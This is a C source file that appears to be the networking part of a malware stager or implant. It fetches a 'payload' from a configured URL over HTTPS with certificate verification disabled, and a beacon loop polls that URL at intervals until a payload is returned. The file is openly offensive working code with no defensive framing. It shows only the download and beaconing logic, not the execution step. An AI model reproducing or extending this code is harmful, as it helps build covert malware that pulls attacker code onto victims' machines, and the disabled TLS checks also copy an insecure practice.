#include "networking.h"
#include "preferences.h"

/*
    Function to overwrite libcurl's default WriteCallback
    Will write all incoming data to passed in MemoryStruct pointer's memory element
    Will keep track of the total size of the incoming data
    Will re-size the struct's memory element when needed
*/
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    char *ptr = realloc(mem->memory, mem->size + realsize + 1); // re-size the memory element
    if (ptr == NULL)
    {
        /* out of memory! */
        return 0;
    }

    // save incoming data
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

/*
    Will retrieve the file at the given URL using libcurl and will store it in a MemoryStruct object
    Will return the filled in MemoryStruct object holding the file and it's size
*/
struct MemoryStruct getHTTPS()
{
    CURL *curl_handle;
    CURLcode res;
    struct MemoryStruct payload;
    long httpCode = 0;

    payload.memory = malloc(1); // will grow, just set to 1 to have it set up
    payload.size = 0;           // size will grow, set to 0 to start

    curl_global_init(CURL_GLOBAL_ALL);

    curl_handle = curl_easy_init();
    if (curl_handle)
    {
        curl_easy_setopt(curl_handle, CURLOPT_URL, PAYLOAD_URL);                   // set url
        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteMemoryCallback); // set writing function override
        curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)&payload);        // set writing destination
        curl_easy_setopt(curl_handle, CURLOPT_FAILONERROR, (long)1);
        curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYHOST, (long)0);
        curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYPEER, (long)0);

        res = curl_easy_perform(curl_handle);

        curl_easy_getinfo(curl_handle, CURLINFO_RESPONSE_CODE, &httpCode);

        //error checking
        if ((res != CURLE_OK) || (res == CURLE_HTTP_RETURNED_ERROR))
        {
            free(payload.memory);
            payload.memory = NULL; // return null pointer for error
            return payload;
        }

        //always cleanup
        curl_easy_cleanup(curl_handle);
    }
    return payload;
}

struct MemoryStruct beacon()
{
    struct MemoryStruct payload;

    if (BEACON_MODE <= 0)
    {
        payload = getHTTPS();
        if (payload.memory == NULL)
        {            // error condition
            exit(0); // if file not obtained and set to only beacon once, exit immediately
        }
    }
    else
    { // beacon every x seconds
        while (1)
        {
            sleep(BEACON_MODE);
            payload = getHTTPS();
            if (payload.memory == NULL)
            { // continue beaconing if no file returned
                continue;
            }
            break; // exit beaconing loop if file is returned
        }
    }
    return payload;
}